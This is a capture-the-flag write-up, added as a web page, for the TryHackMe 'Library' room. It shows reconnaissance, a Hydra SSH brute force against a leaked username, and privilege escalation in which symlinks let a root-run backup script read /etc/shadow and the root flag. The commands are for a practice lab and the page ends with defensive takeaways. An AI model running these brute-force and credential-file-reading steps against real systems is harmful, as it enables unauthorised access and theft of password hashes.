@@ -1,0 +1,136 @@
+---
+import Article from "../../../layouts/Article.astro";
+import "../../../styles/writeup.css";
+import { withBase } from "../../../utils/paths";
+---
+
+<Article
+  title="Library — Writeup"
+  description="TryHackMe Library room walkthrough — robots.txt credential hint, SSH brute force, and a symlink-based arbitrary file read via a root-run backup script."
+  backHref={withBase('/writeups/thm')}
+  backLabel="cd ./writeups/thm"
+  navTitle="writeups/thm"
+  articleLabel={'TryHackMe "Library"'}
+>
+<div class="container">
+<div class="writeup-header">
+  <span class="platform-tag">TryHackMe</span>
+  <h1>Library</h1>
+  <p class="subtitle">Linux · SSH credential brute force · Symlink-based arbitrary file read via sudo</p>
+  <div class="meta">
+    <span class="meta-item os">Linux</span>
+    <span class="meta-item difficulty easy">Easy</span>
+  </div>
+  <div class="tags">
+    <span class="tag">Information Disclosure</span>
+    <span class="tag">Credential Brute Force</span>
+    <span class="tag">Sudo NOPASSWD</span>
+    <span class="tag">Symlink Attack</span>
+  </div>
+</div>
+
+<div class="toc">
+  <div class="toc-title">Table of Contents</div>
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#enum">Web Enumeration</a></li>
+    <li><a href="#foothold">Brute Force → User Flag</a></li>
+    <li><a href="#privesc">Privilege Escalation → Root</a></li>
+    <li><a href="#takeaways">Takeaways</a></li>
+  </ul>
+</div>
+
+<section class="writeup-section" id="overview">
+  <h2><span class="num">00</span> Overview</h2>
+  <p>Library is a Linux box built around a static "blog" landing page with no real backend. I got the user flag through a leaked username and a weak password found via brute force, then got root through a classic symlink attack against a backup script that was allowed to run as root via sudo.</p>
+  <figure class="screenshot"><img src={withBase('/assets/img/writeups/thm/library-landing.jpg')} alt="Landing page"><figcaption>Landing page</figcaption></figure>
+</section>
+
+<section class="writeup-section" id="recon">
+  <h2><span class="num">01</span> Recon</h2>
+  <p>I started with a standard nmap scan:</p>
+  <pre data-lang="bash"><code>nmap -sV -sC -oN nmap.txt 10.129.184.132</code></pre>
+  <table>
+    <tr><th>Port</th><th>Service</th><th>Version</th></tr>
+    <tr><td>22</td><td>ssh</td><td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</td></tr>
+    <tr><td>80</td><td>http</td><td>Apache httpd 2.4.18 (Ubuntu)</td></tr>
+  </table>
+  <p>The HTTP service returned the page title "Welcome to Blog - Library Machine" and flagged a <code>robots.txt</code> entry worth checking.</p>
+</section>
+
+<section class="writeup-section" id="enum">
+  <h2><span class="num">02</span> Web Enumeration</h2>
+  <p>Browsing the site, it was just a landing page for a blog with nothing immediately exploitable — no login, no file upload. Two things were worth noting:</p>
+  <div class="step"><div class="step-num">1</div><div class="step-body">The author of the blog was listed as <strong style="color:#fff">meliodas</strong>.</div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">The comments section had three usernames: <strong style="color:#fff">root</strong>, <strong style="color:#fff">www-data</strong>, and <strong style="color:#fff">Anonymous</strong>.</div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">Directory brute force:<pre data-lang="bash"><code>gobuster dir -u http://10.129.184.132:80 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -b 404</code></pre>Turned up <code>/robots.txt</code> and <code>/images</code>. The images directory was empty of anything useful, but <code>robots.txt</code> contained a clue:<pre data-lang="text"><code>User-agent: rockyou</code></pre></div></div>
+  <div class="callout"><strong>Why this matters:</strong> a <code>User-agent: rockyou</code> entry is a direct hint toward the <code>rockyou.txt</code> wordlist — the intended path is brute forcing a login with it, not web exploitation.</div>
+  <p>I also tested the comment form on the page, but confirmed it was non-functional: the page is fully static (<code>Last-Modified</code> dated 2019, hardcoded comment entries in the HTML), and the form posts to <code>action="#"</code> — meaning it just resubmits to the same static page and is processed by nothing server-side. A dead end, as expected from the <code>robots.txt</code> clue.</p>
+</section>
+
+<section class="writeup-section" id="foothold">
+  <h2><span class="num">03</span> Brute Force → User Flag</h2>
+  <p>With a hint pointing at <code>rockyou.txt</code> and a username (<code>meliodas</code>) pulled from the blog's author byline, SSH was the obvious target.</p>
+  <div class="step"><div class="step-num">1</div><div class="step-body">I confirmed password auth was actually accepted:<pre data-lang="bash"><code>nmap -p22 --script ssh-auth-methods 10.129.184.132</code></pre><pre data-lang="text"><code>Supported authentication methods:
+  publickey
+  password</code></pre></div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Password auth was enabled, so brute force was viable. I ran Hydra against the <code>meliodas</code> account, using the comment-section usernames as a shortlist but focusing on <code>meliodas</code> specifically since he was the blog's author:<pre data-lang="bash"><code>hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.129.184.132 -t 4</code></pre></div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">Hydra returned a valid password: <code>iloveyou1</code>. I logged in over SSH.</div></div>
+  <span class="flag">🚩 user.txt captured</span>
+</section>
+
+<section class="writeup-section" id="privesc">
+  <h2><span class="num">04</span> Privilege Escalation → Root</h2>
+  <h3>Enumeration</h3>
+  <p><code>id</code> showed nothing immediately useful, so I checked sudo permissions:</p>
+  <pre data-lang="bash"><code>sudo -l</code></pre>
+  <pre data-lang="text"><code>User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py</code></pre>
+  <p>This allows running <code>bak.py</code> as root, with any Python interpreter, no password required.</p>
+  <h3>Reading the script</h3>
+  <pre data-lang="python"><code>#!/usr/bin/env python
+import os
+import zipfile
+
+def zipdir(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+if __name__ == '__main__':
+    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
+    zipdir('/var/www/html', zipf)
+    zipf.close()</code></pre>
+  <p>The script zips up <code>/var/www/html</code> into <code>/var/backups/website.zip</code>, running as root. I couldn't write to the script itself, but that wasn't necessary — <code>zipfile.write()</code> follows symlinks, so if I could write anywhere inside <code>/var/www/html</code>, I could plant a symlink to any file on disk and have root's own backup script read it for me.</p>
+  <h3>Finding a writable spot</h3>
+  <pre data-lang="bash"><code>ls -l /var/www/html/</code></pre>
+  <pre data-lang="text"><code>drwxrwxr-x 3 meliodas meliodas  4096 Aug 24  2019 Blog
+-rw-r--r-- 1 root     root     11321 Aug 24  2019 index.html</code></pre>
+  <p><code>Blog/</code> was owned by <code>meliodas:meliodas</code> with group write — and since I was logged in as meliodas, I had write access there.</p>
+  <h3>The exploit</h3>
+  <div class="step"><div class="step-num">1</div><div class="step-body">Plant a symlink and run the backup as root:<pre data-lang="bash"><code>ln -s /etc/shadow /var/www/html/Blog/shadow_link
+sudo /usr/bin/python3 /home/meliodas/bak.py</code></pre></div></div>
+  <div class="callout warning"><strong>Gotcha:</strong> the sudoers rule matches on the exact path <code>/home/meliodas/bak.py</code>. Running <code>sudo python3 bak.py</code> with a relative path (even from <code>~</code>) fails policy matching — it has to be the full absolute path.</div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Once the backup ran, I pulled the symlinked file out of the archive. <code>zipfile</code> stores paths without the leading <code>/</code>, so the entry name inside the zip was the full path minus the slash:<pre data-lang="bash"><code>unzip -l /var/backups/website.zip | grep shadow
+unzip -p /var/backups/website.zip var/www/html/Blog/shadow_link</code></pre></div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">For the actual flag, I symlinked <code>root.txt</code> instead:<pre data-lang="bash"><code>ln -s /root/root.txt /var/www/html/Blog/root_link
+sudo /usr/bin/python3 /home/meliodas/bak.py
+unzip -p /var/backups/website.zip var/www/html/Blog/root_link</code></pre></div></div>
+  <span class="flag">🚩 root.txt captured</span>
+</section>
+
+<section class="writeup-section" id="takeaways">
+  <h2><span class="num">05</span> Takeaways</h2>
+  <div class="takeaway-card">
+    <ul>
+      <li><strong>robots.txt can leak intent, not just paths.</strong> A <code>User-agent: rockyou</code> entry is an unusual thing to find in a disallow file — it's a deliberate signpost rather than a real crawler directive, and worth treating as a clue rather than noise.</li>
+      <li><strong>Weak, reused passwords remain the easiest way in.</strong> No exploit was needed here — just a username sourced from public content and a password sitting in a top-100k wordlist.</li>
+      <li><strong>zipfile.write() follows symlinks.</strong> Any script that archives a directory tree you can write into — even partially — can be tricked into pulling in files you have no direct read access to, as long as the archiving process itself runs with higher privileges.</li>
+      <li><strong>Sudo path matching is strict.</strong> A NOPASSWD rule scoped to an absolute path won't match a relative invocation, even from the right working directory — always use the full path when exploiting (or defending against) one of these rules.</li>
+      <li><strong>Group-writable web directories are a liability.</strong> A single <code>rwxrwxr-x</code> directory under <code>/var/www/html</code> was enough to pivot a backup script's root privileges into arbitrary file read.</li>
+    </ul>
+  </div>
+</section>
+</div>
+</Article>
